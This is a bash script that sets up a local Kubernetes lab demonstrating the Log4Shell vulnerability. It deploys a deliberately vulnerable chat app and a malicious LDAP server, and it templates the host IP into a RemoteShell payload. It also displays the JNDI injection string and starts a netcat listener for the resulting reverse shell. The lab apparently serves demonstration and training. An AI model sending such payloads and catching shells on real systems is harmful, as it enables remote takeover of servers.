#!/usr/bin/env bash
set -e
. ../base.sh

# Parse command-line arguments
VERBOSE=false
while [[ $# -gt 0 ]]; do
  case $1 in
    -v)
      VERBOSE=true
      shift
      ;;
    tmux)
      TMUX_MODE=true
      shift
      ;;
    *)
      shift
      ;;
  esac
done

function tmux-setup() {
  tmux new-session -d \; \
    send-keys 'kubectl get all' C-m \; \
    send-keys 'kubectl port-forward svc/chat-app-service 8080' C-m \; \
    split-window -v \; \
    send-keys 'kubectl logs -f deploy/chat-app' C-m \; \
    split-window -v \; \
    send-keys '# Send ${jndi:ldap://ldap.darkweb:80/#RemoteShell} to chat-app to trigger Log4Shell' C-m \; \
    send-keys 'nc -lvn 9000' C-m \; \
    select-pane -t 2 \; \
    attach
}

clear

if [[ $TMUX_MODE == true ]]; then
  tmux-setup
  exit 0
fi

banner "Checking for prerequisites"
commands=("nc" "kind" "tmux" "kubectl" "docker" "sed")
missing_packages=()

for cmd in "${commands[@]}"; do
  if ! command -v $cmd &> /dev/null; then
    echo "❌ $cmd"
    missing_packages+=("$cmd")
  else
    echo -e "${GREEN}✔${COLOR_RESET} $cmd"
  fi
done
if [ ${#missing_packages[@]} -ne 0 ]; then
  echo -e "\nThe following required packages are missing: ${RED}${missing_packages[*]}${COLOR_RESET}"
  echo "Please install them and re-run the script."
  exit 1
fi

banner "Checking that Kubernetes cluster is running"
if ! kind get clusters | grep -q vulnerable; then
  kind create cluster --name vulnerable
else
  kubectl config use-context kind-vulnerable
  echo "🔥 Cleaning up any previous deployments"
  result=$(kubectl delete -f chat-app/deployment.yaml) || true 
  result=$(kubectl delete -f log4shell-server/deployment.yaml) || true 
fi

banner "Build images"
echo -n "🛜 Finding local IP address: "
REMOTE_HOST=$(hostname -i)
REMOTE_PORT=9000
echo $REMOTE_HOST
echo "💉 Embedding into log4shell-server"
sed -e "s/__REMOTE_HOST__/$REMOTE_HOST/g" \
    -e "s/__REMOTE_PORT__/$REMOTE_PORT/g" \
    log4shell-server/src/main/java/RemoteShell.orig > log4shell-server/src/main/java/RemoteShell.java

# Set docker build options based on verbose flag
if [[ $VERBOSE == true ]]; then
  DOCKER_BUILD_OPTS="--progress=plain"
else
  DOCKER_BUILD_OPTS="-q"
fi

echo "📦 Building chat-app image..."
docker build $DOCKER_BUILD_OPTS chat-app -f chat-app/Dockerfile -t chat-app
echo "📦 Building log4shell-server image..."
docker build $DOCKER_BUILD_OPTS log4shell-server -f log4shell-server/Dockerfile -t log4shell-server

banner "Populating images into kind node(s)"
echo "🚚 Loading chat-app images into kind cluster"
kind load docker-image chat-app --name vulnerable
echo "🚚 Loading log4shell-server images into kind cluster"
kind load docker-image log4shell-server --name vulnerable

banner "Deploying apps"

# Set kubectl options based on verbose flag
if [[ $VERBOSE == true ]]; then
  KUBECTL_OPTS="-v=6"
else
  KUBECTL_OPTS=""
fi

echo "🚀 Deploying chat-app"
kubectl apply $KUBECTL_OPTS -f chat-app/deployment.yaml
echo "🚀 Deploying log4shell-server"
kubectl apply $KUBECTL_OPTS -f log4shell-server/deployment.yaml

banner "Testing..."
echo "⌚️ Waiting for chat-app to be available..."
kubectl wait --for=condition=available --timeout=600s deployment/chat-app
echo "⌚️ Waiting for log4shell-server to be available..."
kubectl wait --for=condition=available --timeout=600s -n darkweb deployment/log4shell

banner "Ready"
echo "Press ENTER to launch tmux session (ctrl-c to abort)"
read
tmux-setup
